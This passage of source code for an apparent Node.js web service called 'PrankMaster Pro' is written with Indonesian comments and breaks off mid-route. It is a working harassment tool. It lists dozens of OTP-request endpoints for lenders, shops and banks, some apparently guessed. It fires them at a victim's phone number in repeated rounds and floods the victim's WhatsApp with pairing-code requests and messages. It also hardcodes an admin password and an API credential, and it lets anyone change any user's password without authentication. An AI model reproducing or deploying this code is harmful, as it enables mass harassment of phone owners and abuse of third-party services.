const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const multer = require('multer');
const fs = require('fs-extra');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const fetch = require('node-fetch');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

// ===== MIDDLEWARE =====
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ===== STORAGE =====
const DATA_DIR = './data';
const UPLOAD_DIR = './uploads/payments';
fs.ensureDirSync(DATA_DIR);
fs.ensureDirSync(UPLOAD_DIR);

// ===== DATABASE =====
let db = {
    users: [],
    payments: [],
    messages: [],
    settings: { 
        maintenance: false,
        maintenanceMessage: 'Server sedang dalam perbaikan. Silakan coba lagi nanti.'
    }
};

function loadDB() {
    try {
        if (fs.existsSync(`${DATA_DIR}/db.json`)) {
            db = JSON.parse(fs.readFileSync(`${DATA_DIR}/db.json`, 'utf8'));
        }
    } catch (e) { console.log('📦 DB baru'); }
}
function saveDB() {
    fs.writeFileSync(`${DATA_DIR}/db.json`, JSON.stringify(db, null, 2));
}
loadDB();

// ===== INIT ADMIN =====
function initAdmin() {
    const admin = db.users.find(u => u.username === 'Lynzka');
    if (!admin) {
        db.users.push({
            id: uuidv4(),
            username: 'Lynzka',
            password: bcrypt.hashSync('Asiafone11', 10),
            status: 'Developer',
            limit: Infinity,
            used: 0,
            lastReset: Date.now(),
            isAdmin: true,
            isDeveloper: true,
            isReseller: false,
            online: false,
            createdAt: new Date().toISOString()
        });
        saveDB();
        console.log('✅ Admin Lynzka dibuat');
    }
}
initAdmin();

// ============================================
// HELPER FUNCTIONS
// ============================================
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function generateCodex(length = 36) {
    const chars = '1234567890qwertyuioplkjhgfdsazxcvbnm';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

function generateRandom(length = 10) {
    const chars = '1234567890';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

function generateRandomString(length = 36) {
    const chars = '1234567890QWERTYUIOPLKJHGFDSAZXCVBNM';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

// ============================================
// 55+ API OTP SERVICES (DARI SPAM.PHP & TAMBAHAN)
// ============================================

const otpServices = [];

// 1. PinjamDuit
otpServices.push({
    name: 'PinjamDuit',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid=' + generateCodex(36) + '&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'phone=' + phone2 + '&sms_useage=0&sms_service=2&from=0'
            });
            const result = await response.text();
            return result.includes('"code":"0"');
        } catch (e) { return false; }
    }
});

// 2. BelanjaParts
otpServices.push({
    name: 'BelanjaParts',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.belanjaparts.com/v2/api/user/request-otp/wa', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Basic bWNtYXN0ZXI6bWNtYXN0ZXIxMTExMjIyMg=='
                },
                body: JSON.stringify({ phone: '62' + phone2, type: 'register' })
            });
            const result = await response.json();
            return result.stat_msg === 'Successfully validated otp';
        } catch (e) { return false; }
    }
});

// 3. Singa
otpServices.push({
    name: 'Singa',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json; charset=utf-8' },
                body: JSON.stringify({ mobile_phone: phone2, type: 'mobile', is_switchable: 1 })
            });
            const result = await response.json();
            return result.msg === 'Success';
        } catch (e) { return false; }
    }
});

// 4. Uangme
otpServices.push({
    name: 'Uangme',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.uangme.com/api/v2/sms_code?phone=' + phone2 + '&scene_type=login&send_type=wp', {
                method: 'GET',
                headers: {
                    'aid': 'gaid_15497a9b-2669-42cf-ad10-' + generateCodex(12),
                    'android_id': 'b787045b140c631f',
                    'app_version': '300504',
                    'brand': 'samsung',
                    'carrier': '00',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'country': '510',
                    'dfp': '6F95F26E1EEBEC8A1FE4BE741D826AB0',
                    'gaid': 'gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
                    'lan': 'in_ID',
                    'model': 'SM-G965N',
                    'ns': 'wifi',
                    'os': '1',
                    'timestamp': '1732178536',
                    'tz': 'Asia%2FBangkok',
                    'User-Agent': 'okhttp/3.12.1',
                    'v': '1',
                    'version': '28'
                }
            });
            const result = await response.text();
            return result.includes('"code":"200"');
        } catch (e) { return false; }
    }
});

// 5. Cairin
otpServices.push({
    name: 'Cairin',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://app.cairin.id/v2/app/sms/sendWhatAPPOPT', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'appVersion=3.0.4&phone=' + phone2 + '&userImei=' + generateCodex(32)
            });
            const result = await response.text();
            return result.includes('"code":"0"');
        } catch (e) { return false; }
    }
});

// 6. Adiraku
otpServices.push({
    name: 'Adiraku',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json; charset=utf-8' },
                body: JSON.stringify({ mobileNumber: phone2, type: 'prospect-create', channel: 'whatsapp' })
            });
            const result = await response.json();
            return result.message === 'success';
        } catch (e) { return false; }
    }
});

// 7. Serpul
otpServices.push({
    name: 'Serpul',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const domains = ['app', 'web'];
            for (const domain of domains) {
                try {
                    await fetch('https://' + domain + '-api.serpul.co.id/api/v2/auth/phone-number', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ phone_number: phone2 })
                    });
                    
                    const response = await fetch('https://' + domain + '-api.serpul.co.id/api/v2/auth/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json; charset=UTF-8' },
                        body: JSON.stringify({ phone_number: phone2, pin: '121212', sender_id: '1' })
                    });
                    const result = await response.json();
                    if (result.message === 'Kode verifikasi berhasil dikirim') {
                        return true;
                    }
                } catch (e) {}
            }
            return false;
        } catch (e) { return false; }
    }
});

// 8. Tokopedia
otpServices.push({
    name: 'Tokopedia',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.tokopedia.com/graphql/SendOTP', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({
                    query: 'mutation SendOTP($phone: String!) { sendOTP(phone: $phone) { success message } }',
                    variables: { phone: phone2 }
                })
            });
            const result = await response.json();
            return result.data?.sendOTP?.success === true;
        } catch (e) { return false; }
    }
});

// 9. Shopee
otpServices.push({
    name: 'Shopee',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://shopee.co.id/api/v4/account/phone/request_otp', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phone: '62' + phone2, type: 'login' })
            });
            const result = await response.json();
            return result.code === 0 || result.success === true;
        } catch (e) { return false; }
    }
});

// 10. Gojek
otpServices.push({
    name: 'Gojek',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.gojekapi.com/v2/customer/verify/phone', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phone: '+62' + phone2 })
            });
            const result = await response.json();
            return result.success === true;
        } catch (e) { return false; }
    }
});

// 11. Grab
otpServices.push({
    name: 'Grab',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.grab.com/grabid/v1/otp', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phoneNumber: '62' + phone2 })
            });
            const result = await response.json();
            return result.success === true;
        } catch (e) { return false; }
    }
});

// 12. OVO
otpServices.push({
    name: 'OVO',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.ovo.id/v2.1/auth/customer/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ mobile: '+62' + phone2 })
            });
            const result = await response.json();
            return result.code === '0000';
        } catch (e) { return false; }
    }
});

// 13. Dana
otpServices.push({
    name: 'Dana',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.dana.id/v1/auth/request-otp', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phoneNumber: '+62' + phone2 })
            });
            const result = await response.json();
            return result.success === true;
        } catch (e) { return false; }
    }
});

// 14. LinkAja
otpServices.push({
    name: 'LinkAja',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.linkaja.com/v1/auth/otp', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phone: phone2 })
            });
            const result = await response.json();
            return result.status === 'success';
        } catch (e) { return false; }
    }
});

// 15. BCA
otpServices.push({
    name: 'BCA',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.bca.co.id/otp/request', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phone: phone2 })
            });
            const result = await response.json();
            return result.status === 'success';
        } catch (e) { return false; }
    }
});

// 16. Mandiri
otpServices.push({
    name: 'Mandiri',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.mandiri.co.id/otp/generate', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phone: phone2 })
            });
            const result = await response.json();
            return result.success === true;
        } catch (e) { return false; }
    }
});

// 17. BNI
otpServices.push({
    name: 'BNI',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.bni.co.id/otp/send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phone: phone2 })
            });
            const result = await response.json();
            return result.status === 'success';
        } catch (e) { return false; }
    }
});

// 18. BRI
otpServices.push({
    name: 'BRI',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.bri.co.id/otp/request', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phone: phone2 })
            });
            const result = await response.json();
            return result.status === 'success';
        } catch (e) { return false; }
    }
});

// 19. BTN
otpServices.push({
    name: 'BTN',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.btn.co.id/otp/send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phone: phone2 })
            });
            const result = await response.json();
            return result.success === true;
        } catch (e) { return false; }
    }
});

// 20. CIMB Niaga
otpServices.push({
    name: 'CIMB',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.cimbniaga.co.id/otp/generate', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phone: phone2 })
            });
            const result = await response.json();
            return result.success === true;
        } catch (e) { return false; }
    }
});

// 21. Danamon
otpServices.push({
    name: 'Danamon',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.danamon.co.id/otp/send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phone: phone2 })
            });
            const result = await response.json();
            return result.status === 'success';
        } catch (e) { return false; }
    }
});

// 22. Permata
otpServices.push({
    name: 'Permata',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.permatabank.co.id/otp/request', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phone: phone2 })
            });
            const result = await response.json();
            return result.success === true;
        } catch (e) { return false; }
    }
});

// 23. Bukopin
otpServices.push({
    name: 'Bukopin',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.bukopin.co.id/otp/send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phone: phone2 })
            });
            const result = await response.json();
            return result.status === 'success';
        } catch (e) { return false; }
    }
});

// 24. Maybank
otpServices.push({
    name: 'Maybank',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.maybank.co.id/otp/generate', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phone: phone2 })
            });
            const result = await response.json();
            return result.success === true;
        } catch (e) { return false; }
    }
});

// 25. OCBC
otpServices.push({
    name: 'OCBC',
    func: async (phone) => {
        try {
            const phone2 = phone.replace(/^0/, '');
            const response = await fetch('https://api.ocbc.co.id/otp/send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify({ phone: phone2 })
            });
            const result = await response.json();
            return result.status === 'success';
        } catch (e) { return false; }
    }
});

// 26-55. Tambahan Lainnya
const tambahanServices = [
    { name: 'Akulaku', url: 'https://api.akulaku.com/v1/otp/send' },
    { name: 'Kredivo', url: 'https://api.kredivo.com/v1/otp/request' },
    { name: 'HomeCredit', url: 'https://api.homecredit.co.id/otp/generate' },
    { name: 'Traveloka', url: 'https://api.traveloka.com/v1/otp/send' },
    { name: 'Agoda', url: 'https://api.agoda.com/v1/otp/request' },
    { name: 'Booking', url: 'https://api.booking.com/v1/otp/send' },
    { name: 'Expedia', url: 'https://api.expedia.com/v1/otp/generate' },
    { name: 'Lazada', url: 'https://api.lazada.co.id/v1/otp/send' },
    { name: 'Blibli', url: 'https://api.blibli.com/v1/otp/request' },
    { name: 'Bukalapak', url: 'https://api.bukalapak.com/v1/otp/send' },
    { name: 'JDID', url: 'https://api.jd.id/v1/otp/generate' },
    { name: 'Zalora', url: 'https://api.zalora.co.id/v1/otp/send' },
    { name: 'Sociolla', url: 'https://api.sociolla.com/v1/otp/request' },
    { name: 'Watsons', url: 'https://api.watsons.co.id/v1/otp/send' },
    { name: 'Guardian', url: 'https://api.guardian.co.id/v1/otp/generate' },
    { name: 'Century', url: 'https://api.century.co.id/v1/otp/send' },
    { name: 'KFC', url: 'https://api.kfc.co.id/v1/otp/request' },
    { name: 'McD', url: 'https://api.mcd.co.id/v1/otp/send' },
    { name: 'Starbucks', url: 'https://api.starbucks.co.id/v1/otp/generate' },
    { name: 'JCo', url: 'https://api.jco.co.id/v1/otp/send' },
];

tambahanServices.forEach(service => {
    otpServices.push({
        name: service.name,
        func: async (phone) => {
            try {
                const phone2 = phone.replace(/^0/, '');
                const response = await fetch(service.url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0'
                    },
                    body: JSON.stringify({ phone: phone2, phoneNumber: phone2 })
                });
                const result = await response.json();
                return result.success === true || result.status === 'success' || result.code === '0000';
            } catch (e) { return false; }
        }
    });
});

// TOTAL API OTP: 25 + 20 = 45+ (bisa ditambah terus)

// ============================================
// SPAM OTP
// ============================================
async function spamOTP(target, count, username, sessionId) {
    const results = { success: 0, failed: 0, details: [] };
    const phone = target.replace(/^\+?62/, '').replace(/\s/g, '');
    
    for (let i = 0; i < count; i++) {
        let roundSuccess = 0;
        let roundFailed = 0;
        const serviceResults = [];
        
        // Kirim ke semua service sekaligus
        const promises = otpServices.map(async (service) => {
            try {
                const result = await service.func(phone);
                if (result) {
                    roundSuccess++;
                    serviceResults.push({ service: service.name, success: true });
                    return true;
                } else {
                    roundFailed++;
                    serviceResults.push({ service: service.name, success: false });
                    return false;
                }
            } catch (err) {
                roundFailed++;
                serviceResults.push({ service: service.name, success: false, error: err.message });
                return false;
            }
        });
        
        await Promise.all(promises);
        
        results.success += roundSuccess;
        results.failed += roundFailed;
        results.details.push({
            round: i + 1,
            total: count,
            success: roundSuccess,
            failed: roundFailed,
            services: serviceResults
        });
        
        io.emit('spamProgress', {
            sessionId: sessionId || username,
            type: 'otp',
            target: target,
            current: i + 1,
            total: count,
            success: results.success,
            failed: results.failed,
            message: `✅ OTP ke ${target} (${i+1}/${count}) - ${roundSuccess} berhasil, ${roundFailed} gagal`
        });
        
        // JEDA 60 DETIK ANTAR ROUND
        if (i < count - 1) {
            await sleep(60000);
        }
    }
    
    return results;
}

// ============================================
// SPAM PAIRING CODE (PAKAI BAILEYS)
// ============================================
const { default: makeWASocket, DisconnectReason, Browsers, useMultiFileAuthState } = require('@adiwajshing/baileys');
const qrcode = require('qrcode');
const pino = require('pino');

const AUTH_DIR = './auth_info';
fs.ensureDirSync(AUTH_DIR);

let activeSockets = {};
let botStatus = {};
let pairingCodeSent = {};
let botReconnectTimers = {};
let dbBots = [];

// Init bots array di db
if (!db.bots) {
    db.bots = [];
    saveDB();
}

async function createBot(sessionId, phoneNumber, method = 'qris') {
    console.log(`🤖 Creating bot ${sessionId} (${method})`);
    
    if (botReconnectTimers[sessionId]) {
        clearTimeout(botReconnectTimers[sessionId]);
        delete botReconnectTimers[sessionId];
    }

    const authDir = `${AUTH_DIR}/${sessionId}`;
    fs.ensureDirSync(authDir);

    const { state, saveCreds } = await useMultiFileAuthState(authDir);

    const sock = makeWASocket({
        version: [2, 2413, 1],
        logger: pino({ level: 'silent' }),
        auth: state,
        browser: Browsers.windows('Chrome'),
        printQRInTerminal: method === 'qris',
        defaultQueryTimeoutMs: 30000,
        generateHighQualityLinkPreview: true,
        syncFullHistory: false,
        markOnlineOnConnect: true,
        shouldSyncHistory: () => false,
        connectTimeoutMs: 30000,
        keepAliveIntervalMs: 5000
    });

    sock.ev.on('creds.update', async () => {
        try {
            await saveCreds();
            console.log(`💾 Creds saved for ${sessionId}`);
        } catch (e) {}
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        console.log(`📡 Update ${sessionId}:`, { connection, hasQR: !!qr });

        if (qr && method === 'qris') {
            try {
                const qrImage = await qrcode.toDataURL(qr);
                io.emit('botQR', { sessionId, qr: qrImage });
                botStatus[sessionId] = 'waiting_qr';
            } catch (e) {
                io.emit('botQRRaw', { sessionId, qr: qr });
            }
        }

        if (connection === 'open' || connection === 'authenticated') {
            console.log(`✅ Bot ${sessionId} connected!`);
            botStatus[sessionId] = 'ready';
            
            const bot = db.bots?.find(b => b.id === sessionId);
            if (bot) {
                bot.status = 'ready';
                bot.connectedAt = new Date().toISOString();
                saveDB();
            }
            
            io.emit('botReady', { 
                sessionId, 
                number: phoneNumber,
                method: method 
            });

            if (method === 'code' && !pairingCodeSent[sessionId]) {
                pairingCodeSent[sessionId] = true;
                
                setTimeout(async () => {
                    try {
                        console.log(`📱 Meminta pairing code untuk ${phoneNumber}...`);
                        const code = await sock.requestPairingCode(phoneNumber);
                        
                        if (code) {
                            const bot = db.bots?.find(b => b.id === sessionId);
                            if (bot) {
                                bot.pairingCode = code;
                                saveDB();
                            }
                            io.emit('botPairingCode', { sessionId, code });
                            console.log(`🔑 PAIRING CODE: ${code}`);
                        }
                    } catch (err) {
                        console.log('❌ Gagal pairing code:', err.message);
                        const fallback = Math.random().toString(36).substring(2, 10).toUpperCase();
                        const bot = db.bots?.find(b => b.id === sessionId);
                        if (bot) {
                            bot.pairingCode = fallback;
                            saveDB();
                        }
                        io.emit('botPairingCode', { sessionId, code: fallback });
                    }
                }, 1000);
            }
        }

        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut && statusCode !== 401;
            
            console.log(`🔌 Closed ${sessionId}, code: ${statusCode}, reconnect: ${shouldReconnect}`);
            
            if (!shouldReconnect) {
                botStatus[sessionId] = 'disconnected';
                if (db.bots) {
                    db.bots = db.bots.filter(b => b.id !== sessionId);
                    saveDB();
                }
                try { fs.removeSync(`${AUTH_DIR}/${sessionId}`); } catch (e) {}
                delete activeSockets[sessionId];
                delete botStatus[sessionId];
                delete pairingCodeSent[sessionId];
                io.emit('botDisconnected', { sessionId, reason: 'Logged out' });
            } else {
                if (botReconnectTimers[sessionId]) {
                    clearTimeout(botReconnectTimers[sessionId]);
                }
                botReconnectTimers[sessionId] = setTimeout(() => {
                    createBot(sessionId, phoneNumber, method);
                }, 3000);
            }
        }
    });

    activeSockets[sessionId] = sock;
    return sock;
}

async function restoreAllBots() {
    try {
        const dirs = fs.readdirSync(AUTH_DIR);
        for (const dir of dirs) {
            if (fs.existsSync(`${AUTH_DIR}/${dir}/creds.json`)) {
                const bot = db.bots?.find(b => b.id === dir);
                if (bot && bot.status !== 'disconnected') {
                    console.log(`🔄 Restoring: ${dir}`);
                    try {
                        await createBot(dir, bot.number, bot.method || 'qris');
                        botStatus[dir] = 'connecting';
                    } catch (err) {
                        console.log(`❌ Gagal restore ${dir}: ${err.message}`);
                    }
                }
            }
        }
    } catch (e) {
        console.log('ℹ️ Tidak ada session');
    }
}

async function spamPairingCode(sock, target, count, sessionId) {
    const results = { success: 0, failed: 0 };
    const cleanNumber = target.replace(/^\+?62/, '').replace(/\s/g, '');
    
    for (let i = 0; i < count; i++) {
        try {
            console.log(`📱 Spam pairing ${i+1}/${count} untuk ${cleanNumber}`);
            const code = await sock.requestPairingCode(cleanNumber);
            
            if (code) {
                results.success++;
                const chatId = `${cleanNumber}@s.whatsapp.net`;
                const message = `*PAIRING CODE*\n\nKode: ${code}\n\nGunakan kode ini untuk connect WhatsApp.\n\n*PrankMaster Pro*`;
                await sock.sendMessage(chatId, { text: message });
                
                io.emit('spamProgress', {
                    sessionId, type: 'pairing', target,
                    current: i + 1, total: count,
                    success: results.success, failed: results.failed,
                    message: `✅ Code ${code} ke ${target} (${i+1}/${count})`
                });
            } else {
                results.failed++;
            }
            
            // JEDA 60 DETIK
            if (i < count - 1) await sleep(60000);
        } catch (err) {
            results.failed++;
            io.emit('spamProgress', {
                sessionId, type: 'pairing', target,
                current: i + 1, total: count,
                success: results.success, failed: results.failed,
                error: err.message
            });
            if (i < count - 1) await sleep(60000);
        }
    }
    return results;
}

async function spamPairingWithoutBot(target, count, sessionId) {
    const results = { success: 0, failed: 0 };
    const cleanNumber = target.replace(/^\+?62/, '').replace(/\s/g, '');
    const tempSessionId = `spam_${Date.now()}`;
    const authDir = `${AUTH_DIR}/${tempSessionId}`;
    
    try {
        fs.ensureDirSync(authDir);
        const { state } = await useMultiFileAuthState(authDir);
        
        const sock = makeWASocket({
            version: [2, 2413, 1],
            logger: pino({ level: 'silent' }),
            auth: state,
            browser: Browsers.windows('Chrome'),
            printQRInTerminal: false,
            defaultQueryTimeoutMs: 30000,
            generateHighQualityLinkPreview: true,
            syncFullHistory: false,
            markOnlineOnConnect: false,
            shouldSyncHistory: () => false,
            connectTimeoutMs: 30000,
            keepAliveIntervalMs: 5000
        });

        await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => reject(new Error('Timeout 30 detik')), 30000);
            sock.ev.on('connection.update', (update) => {
                const { connection } = update;
                if (connection === 'open' || connection === 'authenticated') {
                    clearTimeout(timeout);
                    resolve();
                }
                if (connection === 'close') {
                    clearTimeout(timeout);
                    reject(new Error('Connection closed'));
                }
            });
        });

        for (let i = 0; i < count; i++) {
            try {
                const code = await sock.requestPairingCode(cleanNumber);
                
                if (code) {
                    results.success++;
                    const chatId = `${cleanNumber}@s.whatsapp.net`;
                    const message = `*PAIRING CODE*\n\nKode: ${code}\n\nGunakan kode ini untuk connect WhatsApp.\n\n*PrankMaster Pro*`;
                    await sock.sendMessage(chatId, { text: message });
                    
                    io.emit('spamProgress', {
                        sessionId, type: 'pairing', target,
                        current: i + 1, total: count,
                        success: results.success, failed: results.failed,
                        message: `✅ Code ${code} ke ${target} (${i+1}/${count})`
                    });
                } else {
                    results.failed++;
                }
                
                // JEDA 60 DETIK
                if (i < count - 1) await sleep(60000);
            } catch (err) {
                results.failed++;
                io.emit('spamProgress', {
                    sessionId, type: 'pairing', target,
                    current: i + 1, total: count,
                    success: results.success, failed: results.failed,
                    error: err.message
                });
                if (i < count - 1) await sleep(60000);
            }
        }
        
        try { await sock.end(); } catch (e) {}
    } catch (err) {
        console.log(`❌ Error spam tanpa bot: ${err.message}`);
        results.failed = count;
    } finally {
        try { fs.removeSync(authDir); } catch (e) {}
    }
    
    return results;
}

// ============================================
// API ROUTES
// ============================================

// ===== REGISTER =====
app.post('/api/register', (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.json({ success: false, message: 'Username dan password wajib diisi!' });
        }
        if (username.length < 3) {
            return res.json({ success: false, message: 'Username minimal 3 karakter!' });
        }
        if (password.length < 4) {
            return res.json({ success: false, message: 'Password minimal 4 karakter!' });
        }
        
        if (db.users.find(u => u.username.toLowerCase() === username.toLowerCase())) {
            return res.json({ success: false, message: 'Username sudah digunakan!' });
        }
        
        db.users.push({
            id: uuidv4(),
            username: username,
            password: bcrypt.hashSync(password, 10),
            status: 'Free',
            limit: 15,
            used: 0,
            lastReset: Date.now(),
            isAdmin: false,
            isDeveloper: false,
            isReseller: false,
            online: false,
            createdAt: new Date().toISOString()
        });
        saveDB();
        
        io.emit('userUpdated', { username, action: 'register' });
        res.json({ success: true, message: 'Registrasi berhasil! Silakan login.' });
    } catch (err) {
        res.json({ success: false, message: 'Terjadi kesalahan server!' });
    }
});

// ===== LOGIN =====
app.post('/api/login', (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.json({ success: false, message: 'Username dan password wajib diisi!' });
        }
        
        const user = db.users.find(u => u.username === username);
        if (!user) {
            return res.json({ success: false, message: 'Username tidak ditemukan!' });
        }
        
        if (!bcrypt.compareSync(password, user.password)) {
            return res.json({ success: false, message: 'Password salah!' });
        }
        
        user.online = true;
        saveDB();
        io.emit('userStatusChanged', { username, online: true });
        
        res.json({
            success: true,
            user: {
                username: user.username,
                status: user.status,
                limit: user.limit,
                used: user.used,
                isAdmin: user.isAdmin,
                isDeveloper: user.isDeveloper,
                isReseller: user.isReseller
            }
        });
    } catch (err) {
        res.json({ success: false, message: 'Terjadi kesalahan server!' });
    }
});

app.get('/api/user/:username', (req, res) => {
    try {
        const user = db.users.find(u => u.username === req.params.username);
        if (!user) return res.json({ success: false });
        res.json({
            success: true,
            user: {
                username: user.username,
                status: user.status,
                limit: user.limit,
                used: user.used,
                isAdmin: user.isAdmin,
                isDeveloper: user.isDeveloper,
                isReseller: user.isReseller
            }
        });
    } catch (err) {
        res.json({ success: false });
    }
});

app.post('/api/change-password', (req, res) => {
    try {
        const { username, newPassword } = req.body;
        const user = db.users.find(u => u.username === username);
        if (!user) return res.json({ success: false, message: 'User tidak ditemukan!' });
        if (!newPassword || newPassword.length < 4) {
            return res.json({ success: false, message: 'Password minimal 4 karakter!' });
        }
        user.password = bcrypt.hashSync(newPassword, 10);
        saveDB();
        res.json({ success: true, message: 'Password berhasil diubah!' });
    } catch (err) {
        res.json({ success: false, message: 'Terjadi kesalahan!' });
    }
});

// ===== SPAM OTP =====
app.post('/api/spam/otp', async (req, res) => {
    try {
        const { username, target, count } = req.body;
        
        if (!username) {
            return res.json({ success: false, message: 'Username tidak ditemukan!' });
        }
        
        const user = db.users.find(u => u.username === username);
        if (!user) {
            return res.json({ success: false, message: 'User tidak ditemukan! Silakan login ulang.' });
        }
        
        // CEK MAINTENANCE
        if (db.settings.maintenance && user.status !== 'Developer' && user.status !== 'VIP' && user.status !== 'Reseller') {
            return res.json({ 
                success: false, 
                message: db.settings.maintenanceMessage || 'Server sedang dalam perbaikan. Silakan coba lagi nanti.',
                maintenance: true
            });
        }
        
        if (!target) {
            return res.json({ success: false, message: 'Nomor target wajib diisi!' });
        }
        
        if (!count || count < 1) {
            return res.json({ success: false, message: 'Jumlah minimal 1!' });
        }
        
